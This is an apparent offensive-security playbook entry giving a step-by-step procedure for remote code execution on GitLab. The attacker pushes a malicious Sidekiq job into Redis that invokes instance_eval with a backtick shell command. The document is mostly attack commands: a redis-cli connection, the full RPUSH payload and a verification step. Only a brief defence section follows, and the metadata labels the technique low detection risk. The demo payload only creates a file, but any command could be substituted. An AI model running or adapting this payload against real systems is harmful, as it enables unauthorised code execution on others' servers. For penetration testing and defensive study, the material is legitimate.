---
id: proc-gitlab-sidekiq-rce
tags:
  - rce
  - gitlab
  - sidekiq
  - redis
  - ruby
type: procedure
tools:
  - '[[tools/Redis-CLI]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/redis-cli-connect]]'
  - '[[commands/rpush-gitlab-shell-job]]'
  - '[[commands/ls-tmp-rce]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
  - '[[Python]]'
updated_at: '2025-12-14T17:23:19.486Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[Python]]'
---
# Enqueue-Malicious-GitLab-Sidekiq-Job

## Summary

This procedure exploits a vulnerability in GitLab's GitlabShellWorker within the Sidekiq job queue, allowing arbitrary code execution by enqueuing a malicious job via Redis. It invokes dangerous methods like instance_eval on the shell object, enabling RCE as the GitLab user. Primary use case is demonstrating internal compromise escalation where Redis access is already obtained.

## Description

The attack targets the Sidekiq job queue backed by Redis in GitLab installations. By accessing Redis, an attacker can push a JSON payload to the 'resque:gitlab:queue:gitlab_shell' queue, specifying the GitlabShellWorker class with arguments for instance_eval and a backtick command (e.g., touching a file). The worker processes this without method validation, executing the code. Tested on Bitnami GitLab CE 9.0.5-0 on Ubuntu 14.04.5. Impact is RCE, but requires prior Redis access, which grants admin privileges already. Expected outcome: Arbitrary code runs as the GitLab application user, limited by OS restrictions on that user.

## Requirements

1. Direct access to the Redis instance (e.g., via network or host compromise)
2. Knowledge of GitLab's Sidekiq queue structure (resque:gitlab:queue:gitlab_shell)
3. Redis CLI tool installed on the attacking machine
4. Target running vulnerable GitLab version (pre-fix for this issue)

## Defense

Defensive measures and detection strategies:

- Secure Redis with authentication, firewalls, and network isolation (e.g., bind to localhost only)
- Monitor Redis for unusual RPUSH operations on Sidekiq queues via logging or SIEM
- Upgrade GitLab to patched versions with method whitelisting in workers
- Implement Sidekiq job validation and input sanitization

## Objectives

1. Enqueue a job that triggers arbitrary Ruby code execution via instance_eval
2. Demonstrate RCE by creating a file or running other commands as GitLab user
3. Highlight risks of exposed internal queues in job processing systems

## Instructions

### Step 1: Connect to Redis

**Context**: Establish a session with the Redis CLI to access the Sidekiq queue.

**Command** ([[commands/redis-cli-connect]]):
```bash
redis-cli -h localhost -p 6379
```

> Connects to the local Redis instance on default port. Replace -h and -p with target details if remote. Expected output: Interactive prompt for Redis commands.

### Step 2: Enqueue the Malicious Job

**Context**: Use RPUSH to add the payload to the gitlab_shell queue, exploiting GitlabShellWorker's vulnerability.

**Command** ([[commands/rpush-gitlab-shell-job]]):
```bash
rpush 'resque:gitlab:queue:gitlab_shell' '{"class":"GitlabShellWorker","args":["instance_eval","`touch /tmp/rce-demo`"],"jid":"Zaep6UXu","enqueued_at":1493166403.21}'
```

> Pushes a JSON payload defining the worker, args (instance_eval with touch command), job ID, and timestamp. Expected output: Queue length integer; job awaits processing by Sidekiq.

### Step 3: Verify Execution

**Context**: Confirm the worker has processed the job by checking for the created file.

**Command** ([[commands/ls-tmp-rce]]):
```bash
ls /tmp/rce-demo
```

> Lists the demonstration file created by the executed code. Expected output: File path if successful, indicating RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[Python]] Ruby

### Sub-Techniques


## Commands Used

- [[commands/redis-cli-connect]]
- [[commands/rpush-gitlab-shell-job]]
- [[commands/ls-tmp-rce]]

## Tools Used

- [[tools/Redis-CLI]]

## Tags

- rce
- gitlab
- sidekiq
- redis
- ruby
